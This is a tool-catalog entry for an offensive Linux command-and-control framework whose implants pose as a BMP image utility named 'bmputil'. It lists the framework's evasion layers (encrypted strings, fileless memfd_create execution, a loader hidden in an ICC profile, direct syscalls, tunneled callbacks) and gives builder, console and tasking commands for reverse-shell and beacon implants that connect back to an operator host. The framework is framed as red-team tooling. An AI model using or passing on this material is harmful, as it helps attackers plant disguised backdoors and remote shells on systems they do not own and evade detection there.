---
name: "fud-c2-framework"
categories:
  - backdoor
version: "git (2026-05-10)"
homepage: "https://github.com/x3r0day/fud-c2-framework"
origin: "kitploit"
recipe: "upstream"
packaged-by: []
build-system: python
meta-checked: "2026-11-09"
github-repo: "x3r0day/fud-c2-framework"
github-stars: 7
github-pushed: "2026-05-10"
github-archived: false
github-match: "exact"
gh-checked: "2026-11-09"
github-commits-year: 3
gh-activity-checked: "2026-11-09"
worth: 4.1
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
license: see repository
github-issues: 0
---

# fud-c2-framework

> "Insect v2" — a Linux C2 whose implants masquerade as a 24-bit BMP image utility: fileless memfd_create execution, runtime-built direct syscalls, ChaCha20-encrypted strings and an ICC-profile-encrypted loader.

*No corpus evidence — derived from upstream documentation.*

## What it's for

Red-team delivery to Linux targets where static analysis should see nothing payload-like. The framework builds two implant profiles from one `builder.py` — an interactive reverse shell and a 30-second task-driven beacon — both emitted as a binary named `bmputil` that plausibly poses as a BMP image-processing tool. Evasion is layered: every string encrypted at build time with per-nonce ChaCha20, the ELF itself XOR-encrypted with a gamma-corrected ICC color table and split across `.rodata.blk*` sections, syscalls assembled at runtime instead of linking libc wrappers, execution via `memfd_create`/`execveat` so nothing touches disk, and connectivity tunneled through a playit.gg Minecraft-handshake tunnel. A multi-session Python console manages both profile types. Upstream describes it as a work in progress.

## Typical use cases

### Build an interactive reverse-shell implant

```
python3 builder.py --profile revshell --host 198.51.100.10 --port 8080 --domain tunnel.example.com
```

Outcome: encrypts the implant's strings and emits the `bmputil` binary pointed at your operator host; run on a target it forks, tunnels home through the playit.gg domain and waits for a `0xDEAD` trigger before tying stdio to the socket and spawning a shell.

### Build a polling beacon instead

```
python3 builder.py --profile beacon --host 198.51.100.10 --port 8080 --domain tunnel.example.com
```

Outcome: same binary name and evasion chain, but task-driven behavior — it registers with the C2, drains queued tasks every 30 seconds, executes them and reports results back rather than holding a session open.

### Run the operator console

```
python3 server.py
```

Outcome: opens the C2 listener on `0.0.0.0:8080` and an `(insect) >` prompt; `list` shows sessions, `use rev-XXXX` attaches to a reverse-shell session, `listen beacon 0.0.0.0 9090` opens an extra listener, `exit` quits.

### Queue work for a beacon

```
(insect) > task bea-deadbeef whoami
(insect) > tasks bea-deadbeef
```

Outcome: the command is queued and executed on the beacon's next check-in via fork+pipe+execve; `tasks` prints the stored results for that session.

### Run the implant under cover on the target

```
./bmputil input.bmp output.bmp --grayscale
```

Outcome: dummy image-processing arguments keep the process looking legitimate while the implant forks in the background, connects back through the tunnel and waits for its trigger.
